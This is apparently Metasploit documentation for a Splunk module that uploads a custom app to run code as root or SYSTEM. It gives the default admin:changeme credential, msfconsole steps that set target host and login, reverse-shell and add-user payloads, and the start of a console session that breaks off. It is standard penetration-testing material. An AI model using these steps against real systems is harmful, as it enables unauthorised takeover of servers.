## Vulnerable Application

This module exploits a feature of Splunk whereby a custom application can be
uploaded through the web based interface. Through the \'script\' search command a
user can call commands defined in their custom application which includes arbitrary
perl or python code. To abuse this behavior, a valid Splunk user with the admin
role is required. By default, this module uses the credential of "admin:changeme",
the default Administrator credential for Splunk. Note that the Splunk web interface
runs as SYSTEM on Windows, or as root on Linux by default. This module has been
tested successfully against Splunk 5.0, 6.1, 6.1.1 and 7.2.4.
Version 7.2.4 has been tested successfully against OSX as well.

## Verification Steps

  1. Start msfconsole
  2. Do: ```use exploit/multi/http/splunk_upload_app_exec```
  3. Set required variables (you will need admin credentials)
  4. Do: ```SET TARGET 1```
  5. Do: ```SET RHOST 192.168.1.1```
  6. Do: ```SET USERNAME admin```
  7. Do: ```SET PASSWORD changeme```
  
  8. (7.2.4 only) If targeting linux or macos the payload ```cmd/unix/reverse_python``` will be automatically selected.
     If targeting windows the payload ```cmd/windows/adduser``` will be automatically selected.

  9. You should get either a reverse shell on port 4444 via the predefined handler (linux/osx) or a new user in case (windows target)

## Options

  **EnableOverwrite**
  Overwrites an app of the same name. Needed if you change the app code in the tgz.
  Is not enabled by default.

## Scenarios

### Testing against 7.2.4 running on OSX

  Given admin credentials we can upload the custom app to SPLUNK, which will provide us with a reverse shell, triggered by the 'search' field API.

  ```
msf5 exploit(multi/http/splunk_upload_app_exec) >
msf5 exploit(multi/http/splunk_upload_app_exec) > set RHOST 172.16.165.1
RHOST => 172.16.165.1
msf5 exploit(multi/http/splunk_upload_app_exec) > set password splunksplunk
password => splunksplunk
msf5 exploit(multi/http/splunk_upload_app_exec) > show targets

Exploit targets:
